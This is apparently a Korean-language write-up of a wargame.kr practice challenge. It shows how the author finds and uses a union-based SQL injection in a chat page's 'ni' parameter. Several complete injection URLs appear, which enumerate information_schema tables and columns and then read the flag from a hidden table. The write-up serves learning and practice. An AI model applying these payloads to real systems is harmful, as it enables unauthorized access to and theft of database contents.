@@ -1,0 +1,78 @@
+힌트를 보면 간단한 sqli 문제라고한다.
+트래픽을 줄이기 위해 어떻게 할지 개발자의 입장에서 생각해보라고한다.
+
+솔직히 먼소린지 모르겠어서 문제부터 접속해보자.
+
+문제에 접속하니 id를 입력하는 폼이 주어져있다.
+
+아무 id나 입력해보니 평범한 채팅 창이 나온다.
+
+개발자도구로 소스를 봐보니 
+1. getchatlog(1) 을 1초마다 계속 실행하고 있다.
+2. getchatlog(1) 은 chatlog.php?t=1을 보내며 getni()함수를 실행
+3. 특정조건하에 getchatlog(2) 실행하며 ni값을 응답결과 값으로 저장
+4. getchatlog(2) 는 chatview.php?t=1&ni=[변수 ni값]을 전송
+5. 채팅기록 사용자 화면에 올림
+
+chatlog.php?t=1에 직접 접속해보니 58885 값이 나왔다. 아직 무슨 의미인지는 모르겠다.
+
+getchatlog(2)를 이용해 chatview.php?t=1&ni=[변수 ni값]을 전송하여
+그거에 대한 응답을 사용자의 화면에 띄우는 것을 소스에서 확인 할 수 있고 
+혹시 getchatlog(2) 를 실행하여 보내는 ni값이 58885가 아닐까 생각해보았다.
+
+아무 채팅글을 세번 입력 후 화면에 뜬 것을 확인하고 다시 chatlog.php?t=1에 들어가보니
+이번에는 58888이라는 값이 결과로 나와있다!!
+
+채팅의 숫자? 뭐 이런것이라고 짐작은 되는데 아직은 이 숫자가 의미하는 바가 정확히는 파악이 되지않고 따라서 이번에는 '나의 이름은 키맨'이라는 내가 알아 볼 수 있는 댓글을 달고 값을 확인해봤다.
+58890이 되었고 이 값을 이용해 chatview.php?t=1&ni=58890에 접속해보았다.
+
+접속하였으나 아무 값도 뜨지않았다....???? 혹시나 하는 마음에 값을 줄여 ni값을 58889로 전송하여 다시 접속해보니
+'나의 이름은 키맨'이라는 문구가 뜬다!!
+
+이번에는 58880으로 접속해보니 그전에 입력했던 채팅글과 함께 다른사람의 채팅글까지 떴다.
+여기서 짐작해 볼 수 있는 것은 
+서버쪽 쿼리가 대충
+select id,ip,글 from [table_name] where ni>[전송받은 ni값] 과 같은 형태라고 추측해 볼 수 있다.
+
+여기서 sqli가 가능한지 실험해보기 위해 간단한 union를 실험해 보겠다.
+
+http://wargame.kr:8080/web_chatting/chatview.php?t=1&ni=58880 union select 1,2,3,4,5--
+
+위와 같은 쿼리를 넣는다고 생각하고 값을 전송해보자!
+
+58880 union select 1,2,3,4,5
+
+python을 이용하여 코드를 짜서 값을 전송해보니 위와 같은 쿼리가 정상적으로 값이 나오고 
+이로써 union sqli 취약점이 있음을 알 수 있다.
+
+브라우저를 이용해 위 쿼리를 다시 전송하고 내가 select 한 1,2,3,4,5 값이 출력된 것을 봐보니
+(하두 글이 많아서 페이지 생성이 오래걸림.....ㅠㅠ)
+
+2 (5..*.) : 3 
+
+위와 같은 채팅글이 생겼고 따라서 2,3,5 부분을 이용해 원하는 값을 데이터베이스에서 출력시키면 되겠다!
+
+취약점이 있는 것을 찾았고 이제 데이터베이스에 숨어져있는 flag값을 찾아야 하기 때문에
+
+http://wargame.kr:8080/web_chatting/chatview.php?t=1&ni=58880 union select 1,table_name,3,4,5 from information_schema.tables where table_schema=database()--
+
+위와 같은 쿼리를 넣어 데이터베이스 메타데이터에 저장되어있는 테이블의 목록을 출력해보자
+
+출력해보니 chat_log , chat_log_secret 두가지의 테이블명이 출력되었다.
+
+딱 봐도 chat_log_secret 테이블이 수상하므로 테이블의 속성을 출력시킨 후 chat_log_secret의 속성을 찾아보겠다.
+
+http://wargame.kr:8080/web_chatting/chatview.php?t=1&ni=58880 union select 1,column_name,3,4,table_name from information_schema.columns where table_schema=database()--
+
+확인해보니 readme 라는 유일한 속성이 존재한다.
+
+http://wargame.kr:8080/web_chatting/chatview.php?t=1&ni=58880 union select 1,readme,3,4,5 from chat_log_secret--
+
+위 쿼리를 이용해 readme 속성값을 읽어보자
+
+flag값이 출력됬다!!!
+
+클리어!!
+
+
+
